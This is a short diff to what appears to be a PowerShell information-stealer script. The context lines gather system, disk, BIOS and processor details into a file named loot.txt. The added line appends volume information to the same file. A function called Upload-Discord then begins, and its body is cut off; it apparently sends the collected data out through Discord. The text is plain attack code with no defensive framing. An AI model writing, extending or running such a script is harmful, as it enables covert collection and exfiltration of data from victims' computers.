@@ -30,6 +30,7 @@ Get-ComputerInfo | Out-File C:\Users\Public\loot.txt -Force -append
 Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" | Out-File C:\Users\Public\loot.txt -Force -append
 Get-CimInstance -ClassName Win32_BIOS | Out-File C:\Users\Public\loot.txt -Force -append
 Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*" | Out-File C:\Users\Public\loot.txt -Force -append
+Get-Volume | Out-File C:\Users\Public\loot.txt -Force -append
 function Upload-Discord {
 [CmdletBinding()]
 param (
